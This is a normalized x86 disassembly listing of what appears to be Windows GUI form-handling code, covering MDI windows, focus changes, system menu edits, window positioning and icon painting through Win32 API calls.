mov eax edi
call sub_449e78
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_449e78
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_461b41
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45edfc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax ebx
call sub_4624a0
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44d054
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_446168
push eax
mov eax ebx
call sub_4461ac
push eax
mov eax ebx
call sub_44d054
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406c34
mov [ ebx + 0x254 ] eax
push ebx
push sub_460a8c
call sub_4218fc
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_456bec
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_44d054
push eax
call SetWindowPos
jmp r-xdata
sub_461c8e
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_461db9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_44a1dc
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_4641ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461dc0
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_461dc8
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_44a448
push 0x0
mov eax ebx
call sub_44d054
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_461e0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44abcc
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_44d054
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44d054
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_461e70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_461f18
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f1f
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
mov eax edi
call sub_45e10c
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_40346c
mov eax ebx
call sub_462228
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_40346c
test al al
jne r-xdata
sub_461f28
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_449b30
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_449b30
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_461e70
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_461f70
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_461e70
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_461f94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4186ec
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_4185cc
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4186ec
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_4185cc
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_462204
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_44d054
mov dx 0xb000
call sub_45ded4
test al al
jne r-xdata
call sub_44d054
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_45ded4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46220b
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403ad0
jmp r-xdata
call sub_403ad0
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_449b30
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_44d054
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_45ded4
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44790c
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
call sub_403ad0
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_44d054
mov dx 0xb01a
call sub_45ded4
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403ad0
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44790c
sub_462228
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44790c
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_44d054
push eax
call SetFocus
mov eax ebx
call sub_44d054
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_462278
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44790c
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_46232c
mov eax esi
call sub_462228
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_44d47c
mov edx eax
mov eax esi
call sub_461e70
sub_4622dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_460ef4
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44790c
mov eax ebx
call sub_460ef4
mov edx esi
call sub_4622dc
sub_46232c
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_45a718
mov edx esi
call sub_45a6fc
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4623d4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_462420
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_4623d4
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_462450
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_4623d4
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_4624bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_42482c
xor eax eax
push ebp
push sub_46256a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_424ba0
xor eax eax
push ebp
push sub_462547
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_40346c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46254e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_424ba0
retn
sub_462578
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_460ef4
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_460f28
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_40346c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_44c31c
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_460f74
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_40346c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_462618
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d054
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_44d054
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_4624a0
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_44d054
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44b1e4
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_462696
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_424118
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_4626f8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44d054
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_44b4a8
pop edi
pop esi
retn
sub_462744
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d054
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_462840
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_461268
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_462744
pop ecx
sub_462874
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_447e28
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44d054
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44d054
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44d054
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_446e00
pop esi
pop ebx
retn
sub_462904
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44c2a8
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_44d054
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45a138
sub_462964
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44b344
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_459b4c
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_4629b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_45a3ac
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4629e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_462a83
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462a8a
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_459aac
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4677a4
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_4438c8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4677a4
jmp r-xdata
sub_462ab0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_40346c
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_462af0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cae0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_462b1c
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4622dc
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_4436a0
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_462b74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c18c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_466158
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_40346c
sub_462c00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_44d054
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_44d054
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_44d054
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_462c98
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44d054
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_462278
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_40346c
sub_462cf0
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_44d588
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_462d1c
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4622dc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_462d38
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
